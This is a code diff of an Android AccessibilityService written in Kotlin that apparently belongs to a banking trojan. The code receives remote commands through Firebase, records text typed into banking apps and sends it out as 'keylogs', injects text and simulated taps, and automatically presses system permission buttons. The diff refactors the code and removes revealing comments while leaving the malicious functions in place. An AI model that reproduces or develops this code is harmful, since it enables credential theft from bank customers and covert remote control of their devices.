@@ -4,14 +4,13 @@ import android.accessibilityservice.AccessibilityService
 import android.accessibilityservice.GestureDescription
 import android.content.Intent
 import android.graphics.Path
-import android.os.Build
 import android.view.accessibility.AccessibilityEvent
 import android.view.accessibility.AccessibilityNodeInfo
 import com.google.firebase.database.ChildEventListener
 import com.google.firebase.database.DataSnapshot
 import com.google.firebase.database.DatabaseError
 
-class AccessibilityService : AccessibilityService() {
+class AccessibilityService() : AccessibilityService() {
 
     companion object {
         var instance: AccessibilityService? = null
@@ -20,7 +19,7 @@ class AccessibilityService : AccessibilityService() {
     override fun onServiceConnected() {
         super.onServiceConnected()
         instance = this
-        // Listen for commands from Firebase
+        // Listen for commands
         FirebaseBridge.commandsRef.addChildEventListener(object : ChildEventListener {
             override fun onChildAdded(snapshot: DataSnapshot, previous: String?) {
                 val cmd = snapshot.getValue(Command::class.java) ?: return
@@ -37,7 +36,6 @@ class AccessibilityService : AccessibilityService() {
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
         event ?: return
         val pkg = event.packageName?.toString() ?: return
-        // Bank keylog detection
         if (isBankApp(pkg)) {
             val text = event.text?.joinToString("") ?: return
             if (text.isNotBlank()) FirebaseBridge.sendKeylog(pkg, text)
@@ -46,7 +44,8 @@ class AccessibilityService : AccessibilityService() {
 
     override fun onInterrupt() {}
 
-    // =================== Public gesture methods ===================
+    // ===================== PUBLIC METHODS =====================
+
     fun tap(x: Int, y: Int) {
         val path = Path().apply { moveTo(x.toFloat(), y.toFloat()) }
         val stroke = GestureDescription.StrokeDescription(path, 0L, 100L)
@@ -80,12 +79,6 @@ class AccessibilityService : AccessibilityService() {
         startActivity(intent)
     }
 
-    fun autoTapPermissionButton() {
-        val root = rootInActiveWindow ?: return
-        findAndTapButton(root, listOf("com.android.systemui:id/start_button", "permission_allow_button"))
-    }
-
-    // Make injectText accessible from CommandProcessor
     fun injectText(text: String) {
         val root = rootInActiveWindow ?: return
         val focused = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT)
@@ -97,7 +90,13 @@ class AccessibilityService : AccessibilityService() {
         }
     }
 
-    // =================== Private helpers ===================
+    fun autoTapPermissionButton() {
+        val root = rootInActiveWindow ?: return
+        findAndTapButton(root, listOf("com.android.systemui:id/start_button", "permission_allow_button"))
+    }
+
+    // ===================== PRIVATE HELPERS =====================
+
     private fun findAndTapButton(node: AccessibilityNodeInfo, ids: List<String>) {
         for (id in ids) {
             val target = findNodeWithId(node, id) ?: continue
